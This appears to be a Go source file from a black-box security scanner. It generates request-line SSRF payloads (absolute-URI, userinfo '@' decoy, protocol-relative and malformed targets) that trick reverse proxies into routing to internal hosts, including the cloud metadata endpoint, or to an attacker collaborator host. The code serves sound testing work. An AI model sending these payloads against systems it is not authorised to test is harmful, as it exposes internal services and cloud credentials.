package infra

// Request-line "routing-based SSRF" payload ladder, from PortSwigger's "Cracking
// the lens: targeting HTTPS' hidden attack surface" research.
//
// Background: a reverse proxy / load balancer / TLS terminator decides which
// backend to route a request to. Many such intermediaries validate (or
// allowlist) the Host header but forget that the *request line* can independently
// name a host — in absolute-form ("GET http://internal/ HTTP/1.1"), via a
// userinfo trick ("GET @attacker/ HTTP/1.1"), or protocol-relative
// ("GET //attacker/ HTTP/1.1"). When the proxy routes on the request-line host
// but trusts the Host header, an attacker connected to the victim can make the
// proxy reach an arbitrary backend (an internal service, the cloud metadata
// endpoint) or an attacker-controlled collaborator host.
//
// These payloads are written *verbatim* onto the request line via the requester's
// http.Options.RawRequestTarget (the rawhttp client sends the uripath argument
// un-normalized) while the TCP/TLS connection still goes to the victim host. They
// are NOT URL-parameter values — for the parameter-injection authority-confusion
// ladder see urlconfuse.go (AuthorityConfusionPayloads).

// RoutingTargetClass categorizes a request-line target by the parser/routing
// quirk it exercises.
type RoutingTargetClass string

const (
	// RoutingAbsolute is an absolute-form request URI: "http://effective/".
	RoutingAbsolute RoutingTargetClass = "absolute-uri"
	// RoutingUserinfo hides the effective host behind a userinfo "@": the proxy's
	// validator may read the decoy before the "@", the router the host after it.
	RoutingUserinfo RoutingTargetClass = "userinfo"
	// RoutingProtoRel is a protocol-relative "//effective/" target.
	RoutingProtoRel RoutingTargetClass = "protocol-relative"
	// RoutingMalformed covers leading-whitespace / non-"/" path quirks.
	RoutingMalformed RoutingTargetClass = "malformed-target"
)

// RoutingTarget is one literal request-line target plus a label for evidence.
type RoutingTarget struct {
	// Target is the exact request-URI to write on the wire (no normalization).
	Target string
	// Label is a short human-readable description of the quirk, for findings.
	Label string
	// Class is the routing-quirk family this target belongs to.
	Class RoutingTargetClass
}

// RoutingTargets returns the request-line ladder for reaching effective while the
// connection (and the trusted Host header) name victimHost.
//
//   - victimHost is the real Host header value the proxy is expected to trust
//     (e.g. "shop.example.com"); it seeds the userinfo-decoy orientation.
//   - effective is the host the proxy should actually reach, INCLUDING any path
//     and a trailing slash — e.g. "abcd.oast.site/", "169.254.169.254/latest/meta-data/",
//     or "127.0.0.1:8080/". A trailing slash matters for the "@effective/" form,
//     whose exploit requires the path to start with "/".
//
// Both userinfo orientations and the absolute http/https forms are emitted
// because which one a given (validator, router) pair mis-handles is unknown in a
// black-box scan; the OAST callback (external) or the response differential /
// metadata marker (internal) reveals which target won.
func RoutingTargets(victimHost, effective string) []RoutingTarget {
	return []RoutingTarget{
		{"http://" + effective, "absolute-uri http://effective", RoutingAbsolute},
		{"https://" + effective, "absolute-uri https://effective", RoutingAbsolute},
		{"http://" + victimHost + "@" + effective, "userinfo victim@effective", RoutingUserinfo},
		{"http://" + victimHost + ":80@" + effective, "userinfo+port victim:80@effective", RoutingUserinfo},
		{"@" + effective, "non-slash @effective", RoutingUserinfo},
		{"//" + effective, "protocol-relative //effective", RoutingProtoRel},
		{" http://" + effective, "leading-space absolute-uri", RoutingMalformed},
	}
}
